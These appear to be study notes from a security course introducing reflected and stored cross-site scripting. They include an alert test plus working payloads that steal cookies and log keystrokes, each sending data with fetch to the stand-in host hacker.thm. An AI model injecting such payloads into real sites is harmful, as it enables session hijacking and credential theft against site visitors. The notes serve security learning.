![](Pasted%20image%2020241112155322.png)

# Introduction

In XSS attacker injects malicious JavaScript code in a vulnerable web server. There are two types of XSS.

- Reflected XSS
- Stored XSS

## Reflected  XSS

In this scenario, attacker sends the payload to via URL and response is reflected back. 

![](Pasted%20image%2020241112181518.png)

# POC

### General usage

After putting JavaScript code to web page's input field if the page reacts as per the code then the web page is vulnerable to XSS

```
<script>alert('XSS');</script>
```

### Session stealing

Most users details are stored in the form of cookies. This can be accessed by document.cookie. btoa function convert parameter to base64 and fetch function generating request to attackers webserver, giving access to users cookies when they visit infected page.

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

### Key Logger:

Below is similar version of JS code that sends base64 to attacker of the key - on key press.

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

